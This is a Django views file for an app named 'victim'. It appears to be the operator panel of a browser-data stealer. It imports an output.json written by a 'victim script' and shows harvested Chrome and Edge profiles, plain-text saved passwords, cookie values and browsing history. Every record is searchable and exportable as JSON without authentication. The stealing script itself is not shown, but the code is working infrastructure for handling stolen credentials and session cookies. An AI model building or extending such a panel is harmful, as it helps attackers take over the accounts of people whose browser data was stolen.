from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from django.http import JsonResponse
from django.core.paginator import Paginator
from django.db.models import Q
import json
import os
from .models import BrowserProfile, Password, Cookie, HistoryEntry

def dashboard(request):
    total_profiles = BrowserProfile.objects.count()
    total_passwords = Password.objects.count()
    total_cookies = Cookie.objects.count()
    total_history = HistoryEntry.objects.count()
    
    recent_profiles = BrowserProfile.objects.all()[:5]
    
    context = {
        'total_profiles': total_profiles,
        'total_passwords': total_passwords,
        'total_cookies': total_cookies,
        'total_history': total_history,
        'recent_profiles': recent_profiles,
    }
    return render(request, 'victim/dashboard.html', context)

def profiles_list(request):
    profiles = BrowserProfile.objects.all()
    
    search = request.GET.get('search', '')
    if search:
        profiles = profiles.filter(
            Q(name__icontains=search) | 
            Q(browser_type__icontains=search)
        )
    
    paginator = Paginator(profiles, 20)
    page_number = request.GET.get('page')
    page_obj = paginator.get_page(page_number)
    
    context = {
        'page_obj': page_obj,
        'search': search,
    }
    return render(request, 'victim/profiles_list.html', context)

def profile_detail(request, profile_id):
    profile = get_object_or_404(BrowserProfile, id=profile_id)
    
    passwords = profile.passwords.all()[:10]
    cookies = profile.cookies.all()[:10]
    history = profile.history.all()[:10]
    
    context = {
        'profile': profile,
        'passwords': passwords,
        'cookies': cookies,
        'history': history,
    }
    return render(request, 'victim/profile_detail.html', context)

def passwords_list(request):
    passwords = Password.objects.select_related('browser_profile').all()
    
    search = request.GET.get('search', '')
    if search:
        passwords = passwords.filter(
            Q(username__icontains=search) | 
            Q(url__icontains=search) |
            Q(browser_profile__name__icontains=search)
        )
    
    browser_type = request.GET.get('browser_type', '')
    if browser_type:
        passwords = passwords.filter(browser_profile__browser_type=browser_type)
    
    paginator = Paginator(passwords, 50)
    page_number = request.GET.get('page')
    page_obj = paginator.get_page(page_number)
    
    context = {
        'page_obj': page_obj,
        'search': search,
        'browser_type': browser_type,
    }
    return render(request, 'victim/passwords_list.html', context)

def cookies_list(request):
    cookies = Cookie.objects.select_related('browser_profile').all()
    
    search = request.GET.get('search', '')
    if search:
        cookies = cookies.filter(
            Q(name__icontains=search) | 
            Q(host_key__icontains=search) |
            Q(browser_profile__name__icontains=search)
        )
    
    paginator = Paginator(cookies, 50)
    page_number = request.GET.get('page')
    page_obj = paginator.get_page(page_number)
    
    context = {
        'page_obj': page_obj,
        'search': search,
    }
    return render(request, 'victim/cookies_list.html', context)

def history_list(request):
    history = HistoryEntry.objects.select_related('browser_profile').all()
    
    search = request.GET.get('search', '')
    if search:
        history = history.filter(
            Q(title__icontains=search) | 
            Q(url__icontains=search) |
            Q(browser_profile__name__icontains=search)
        )
    
    paginator = Paginator(history, 50)
    page_number = request.GET.get('page')
    page_obj = paginator.get_page(page_number)
    
    context = {
        'page_obj': page_obj,
        'search': search,
    }
    return render(request, 'victim/history_list.html', context)

def import_data(request):
    if request.method == 'POST':
        print(os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'v', 'output.json'))
        try:
            output_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'v', 'output.json')
            if not os.path.exists(output_path):
                messages.error(request, 'No output.json file found. Run the victim script first.')
                return redirect('victim:dashboard')
            
            with open(output_path, 'r') as f:
                data = json.load(f)
            
            imported_count = 0
            
            for browser_data in data:
                for profile_data in browser_data:
                    profile, created = BrowserProfile.objects.get_or_create(
                        name=profile_data['name'],
                        defaults={
                            'browser_type': 'Chrome' if 'chrome' in profile_data.get('name', '').lower() else 'Edge'
                        }
                    )
                    
                    for pwd_data in profile_data.get('passwords', []):
                        Password.objects.get_or_create(
                            browser_profile=profile,
                            url=pwd_data['url'],
                            username=pwd_data['username'],
                            defaults={'password': pwd_data['password']}
                        )
                    
                    for cookie_data in profile_data.get('cookies', {}).get('cookies', []):
                        Cookie.objects.get_or_create(
                            browser_profile=profile,
                            host_key=cookie_data.get('host_key', ''),
                            name=cookie_data.get('name', ''),
                            defaults={
                                'creation_utc': cookie_data.get('creation_utc', 0),
                                'top_frame_site_key': cookie_data.get('top_frame_site_key', ''),
                                'value': cookie_data.get('value', ''),
                                'encrypted_value': cookie_data.get('encrypted_value', ''),
                                'path': cookie_data.get('path', ''),
                                'expires_utc': cookie_data.get('expires_utc', 0),
                                'is_secure': cookie_data.get('is_secure', False),
                                'is_httponly': cookie_data.get('is_httponly', False),
                                'last_access_utc': cookie_data.get('last_access_utc', 0),
                                'has_expires': cookie_data.get('has_expires', False),
                                'is_persistent': cookie_data.get('is_persistent', False),
                                'priority': cookie_data.get('priority', 0),
                                'samesite': cookie_data.get('samesite', 0),
                                'source_scheme': cookie_data.get('source_scheme', 0),
                                'source_port': cookie_data.get('source_port', 0),
                                'is_same_party': cookie_data.get('is_same_party', False),
                                'last_update_utc': cookie_data.get('last_update_utc', 0),
                                'is_edgelegacycookie': cookie_data.get('is_edgelegacycookie', False),
                                'browser_provenance': cookie_data.get('browser_provenance', 0),
                            }
                        )
                    
                    imported_count += 1
            
            messages.success(request, f'Successfully imported data from {imported_count} profiles.')
            
        except Exception as e:
            messages.error(request, f'Error importing data: {str(e)}')
    
    return redirect('victim:dashboard')

def export_data(request, profile_id=None):
    if profile_id:
        profile = get_object_or_404(BrowserProfile, id=profile_id)
        data = {
            'profile': {
                'name': profile.name,
                'browser_type': profile.browser_type,
                'passwords': list(profile.passwords.values()),
                'cookies': list(profile.cookies.values()),
                'history': list(profile.history.values()),
            }
        }
    else:
        data = {
            'profiles': list(BrowserProfile.objects.values()),
            'passwords': list(Password.objects.values()),
            'cookies': list(Cookie.objects.values()),
            'history': list(HistoryEntry.objects.values()),
        }
    
    return JsonResponse(data, safe=False)

def api_docs(request):
    return render(request, 'victim/api_docs.html')